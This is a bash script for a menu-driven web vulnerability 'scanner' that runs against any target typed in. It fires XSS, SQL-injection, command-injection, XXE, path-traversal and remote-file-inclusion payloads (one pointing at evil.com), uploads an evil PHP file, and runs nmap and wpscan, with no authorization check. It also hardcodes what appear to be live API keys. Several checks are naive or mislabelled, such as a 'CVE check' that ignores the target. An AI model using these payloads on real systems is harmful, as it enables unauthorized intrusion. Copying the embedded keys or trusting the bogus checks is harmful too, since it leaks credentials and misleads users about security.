#!/bin/bash
shodan_key="R8C45zz370Hvp0prryFmF3bED2AZbZE8"
virustotal_key="ae781046ae89ddad6cc80608ad71b9995aecd953bf96ce3de12391529d36f78d"
securitytrails_key="sY2Cq8MTA4BwN7diurC6VM5fpwjyG1DL"
whois_key="at_pF77rN8RmJJKFU2We1l7rqzlD6h7W"
ssl_labs_api="https://api.ssllabs.com/api/v3/analyze?host="
nvd_api_key="177e0f5f-2c4c-4561-9316-5be2fc277e8c"  # Your NVD API Key
# User input for target domain or IP

echo "Enter the target domain or IP:"
read target
echo "Choose a test:"
echo "1) Subdomain Enumeration"
echo "2) WHOIS Lookup"
echo "3) Port Scanning"
echo "4) OSINT (IP info, Geo-location)"
echo "5) XSS Vulnerability Check"
echo "6) Remote Code Execution (RCE) Detection"
echo "7) Command Injection Detection"
echo "8) File Inclusion Vulnerabilities"
echo "9) Subdomain Takeover Detection"
echo "10) SSL/TLS Misconfiguration Check"
echo "11) HTTP Header Misconfigurations"
echo "12) Directory Traversal"
echo "13) Subdomain Brute Force"
echo "14) SSRF Vulnerability Check"
echo "15) CSRF Vulnerability Check"
echo "16) SQL Injection Advanced Test"
echo "17) Sensitive Data Exposure"
echo "18) Command Execution via Deserialization"
echo "19) XXE Injection Test"
echo "20) PHP Info Disclosure"
echo "21) File Upload Vulnerabilities"
echo "22) Server Banner Grabbing"
echo "23) DNS Amplification Attack Detection"
echo "24) HTTP Response Splitting"
echo "25) CORS Misconfiguration"
echo "26) Remote File Inclusion (RFI)"
echo "27) Open Redirects"
echo "28) SQL Injection (Blind and Time-Based)"
echo "29) HTTP Host Header Injection"
echo "30) Buffer Overflow"
echo "31) CRLF Injection"
echo "32) Application Logic Bugs"
echo "33) Vulnerable Components (Known Exploits)"
echo "34) CVE Vulnerability Check"
echo "35) Exit"
read choice

# CVE List
CVE_LIST=(
    "CVE-2021-23337"
    "CVE-2018-16487"
    "CVE-2019-10744"
    "CVE-2020-28039"
    "CVE-2021-38003"
    "CVE-2022-24701"
    "CVE-2021-3802"
    "CVE-2020-28488"
    "CVE-2021-23330"
    "CVE-2017-18094"
)

NVD_API="https://api.nvd.nist.gov/vuln/detail/"
# Function to check CVE details from the NVD API
check_cve_nvd() {
    cve=$1
    response=$(curl -s "https://services.nvd.nist.gov/rest/json/cve/1.0/$cve?apiKey=$nvd_api_key")
    
    # Check if CVE data exists and if it's not "Not Found"
    if [[ $response == *"error"* ]]; then
        echo "$cve is not found or doesn't have detailed data."
    else
        echo "Details for $cve:"
        echo "$response" | jq '.'  # Format the JSON response
    fi
}

# CVE Vulnerability Check
if [ "$choice" == "34" ]; then
    echo "Starting CVE Vulnerability Check for $target..."
    for cve in "${CVE_LIST[@]}"; do
        check_cve_nvd "$cve"
    done

# Subdomain Enumeration
elif [ "$choice" == "1" ]; then
    echo "Starting Subdomain Enumeration for $target..."
    curl "https://api.securitytrails.com/v1/domain/$target/subdomains" -H "APIKEY: $securitytrails_key"

# WHOIS Lookup
elif [ "$choice" == "2" ]; then
    echo "Starting WHOIS Lookup for $target..."
    curl "https://www.whoisxmlapi.com/whoisserver/WhoisService?apiKey=$whois_key&domainName=$target&outputFormat=JSON"

# Port Scanning with Nmap
elif [ "$choice" == "3" ]; then
    echo "Starting Nmap Port Scan for $target..."
    nmap -sV $target

# OSINT: IP Info and Geo-location
elif [ "$choice" == "4" ]; then
    echo "Retrieving OSINT information for $target..."
    curl "https://ipinfo.io/$target/json?token=your_ipinfo_token"

# XSS Vulnerability Check (Basic and DOM-based)
elif [ "$choice" == "5" ]; then
    echo "Checking for XSS vulnerabilities on $target..."
    curl "$target/?search=<script>alert('XSS')</script>"
    curl "$target/?param=<img src=x onerror=alert(1)>"

# Remote Code Execution (RCE) Detection
elif [ "$choice" == "6" ]; then
    echo "Testing for Remote Code Execution on $target..."
    curl "$target/execute?cmd=whoami"  # Example payload
    curl "$target/run?command=id"      # Example payload

# Command Injection Detection
elif [ "$choice" == "7" ]; then
    echo "Testing for Command Injection on $target..."
    curl "$target?cmd=id; ls"         # Example payload

# File Inclusion Vulnerabilities
elif [ "$choice" == "8" ]; then
    echo "Checking for File Inclusion vulnerabilities on $target..."
    curl "$target/index.php?page=../../etc/passwd"
    curl "$target/index.php?page=php://input"

# Subdomain Takeover Detection
elif [ "$choice" == "9" ]; then
    echo "Checking for Subdomain Takeover on $target..."
    # Use APIs or logic to check for possible subdomain takeovers
    curl "https://api.securitytrails.com/v1/domain/$target/subdomains" -H "APIKEY: $securitytrails_key" | grep "not found"

# SSL/TLS Misconfigurations
elif [ "$choice" == "10" ]; then
    echo "Checking SSL/TLS configuration for $target..."
    curl "$ssl_labs_api$target"

# HTTP Header Misconfigurations
elif [ "$choice" == "11" ]; then
    echo "Checking HTTP Headers for $target..."
    curl -I $target | grep -i "x-frame-options\|x-content-type-options\|strict-transport-security\|content-security-policy"

# Directory Traversal (Path Traversal)
elif [ "$choice" == "12" ]; then
    echo "Testing for Directory Traversal (Path Traversal) on $target..."
    curl "$target/index.php?page=../../../../etc/passwd"

# Subdomain Brute Force
elif [ "$choice" == "13" ]; then
    echo "Brute forcing subdomains for $target..."
    # Use a wordlist for brute-forcing subdomains (example: `subdomains.txt`)
    for subdomain in $(cat subdomains.txt); do
        curl -Is $subdomain.$target | head -n 1
    done

# SSRF Vulnerability Check
elif [ "$choice" == "14" ]; then
    echo "Testing for SSRF vulnerabilities on $target..."
    curl "$target/?url=http://localhost:8000"  # Try local server
    curl "$target/?url=http://127.0.0.1"      # Try localhost

# CSRF Vulnerability Check
elif [ "$choice" == "15" ]; then
    echo "Testing for CSRF vulnerabilities on $target..."
    # Example payloads that could be used for CSRF testing
    curl -X POST $target/login -d "username=attacker&password=evilpassword"

# SQL Injection Advanced Test
elif [ "$choice" == "16" ]; then
    echo "Running advanced SQL Injection tests for $target..."
    curl "$target/?id=1' OR 1=1--"
    curl "$target/?id=1' UNION SELECT null, version()--"

# Sensitive Data Exposure
elif [ "$choice" == "17" ]; then
    echo "Checking for Sensitive Data Exposure on $target..."
    curl "$target/.env"

# Command Execution via Deserialization
elif [ "$choice" == "18" ]; then
    echo "Testing for command execution via deserialization on $target..."
    curl "$target/upload.php" -F "file=@malicious_serialized_object"

# XXE Injection Test
elif [ "$choice" == "19" ]; then
    echo "Testing for XXE Injection on $target..."
    curl "$target/?xml=<xml><!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo></xml>"

# PHP Info Disclosure
elif [ "$choice" == "20" ]; then
    echo "Checking for PHP Info Disclosure on $target..."
    curl "$target/phpinfo.php"

# File Upload Vulnerabilities
elif [ "$choice" == "21" ]; then
    echo "Testing for File Upload Vulnerabilities on $target..."
    curl -F "file=@evilfile.php" "$target/upload.php"

# Server Banner Grabbing
elif [ "$choice" == "22" ]; then
    echo "Grabbing server banners for $target..."
    curl -I $target

# DNS Amplification Attack Detection
elif [ "$choice" == "23" ]; then
    echo "Testing for DNS amplification attacks on $target..."
    # Use tools for DNS amplification detection or abuse tests
    dig @8.8.8.8 $target

# HTTP Response Splitting
elif [ "$choice" == "24" ]; then
    echo "Testing for HTTP Response Splitting on $target..."
    curl "$target/?param=value%0D%0ASet-Cookie:evilcookie"

# CORS Misconfiguration
elif [ "$choice" == "25" ]; then
    echo "Testing for CORS Misconfiguration on $target..."
    curl -I $target -H "Origin: http://evil.com"

# Remote File Inclusion (RFI)
elif [ "$choice" == "26" ]; then
    echo "Testing for Remote File Inclusion (RFI) on $target..."
    curl "$target/index.php?page=http://evil.com/malicious_script.php"

# Open Redirects
elif [ "$choice" == "27" ]; then
    echo "Testing for Open Redirects on $target..."
    curl "$target/?redirect=http://evil.com"

# SQL Injection (Blind and Time-Based)
elif [ "$choice" == "28" ]; then
    echo "Testing for Blind and Time-Based SQL Injection on $target..."
    curl "$target/?id=1' AND 1=1--"
    curl "$target/?id=1' AND SLEEP(5)--"

# HTTP Host Header Injection
elif [ "$choice" == "29" ]; then
    echo "Testing for Host Header Injection on $target..."
    curl -H "Host: evil.com" $target

# Buffer Overflow
elif [ "$choice" == "30" ]; then
    echo "Testing for Buffer Overflow on $target..."
    curl "$target/?param=$(python -c 'print "A" * 5000')"

# CRLF Injection
elif [ "$choice" == "31" ]; then
    echo "Testing for CRLF Injection on $target..."
    curl "$target/?param=value%0D%0ASet-Cookie:evilcookie"

# Application Logic Bugs
elif [ "$choice" == "32" ]; then
    echo "Testing for Application Logic Bugs on $target..."
    curl "$target/?action=login&username=admin&password=admin"

# Vulnerable Components (Known Exploits)
elif [ "$choice" == "33" ]; then
    echo "Checking for vulnerable components on $target..."
    # This can include using tools like WPScan for WordPress vulnerabilities
    wp_scan_result=$(wpscan --url $target --enumerate vp)
    echo "$wp_scan_result"

# Exit
elif [ "$choice" == "35" ]; then
    echo "Exiting script."
    exit 0
fi
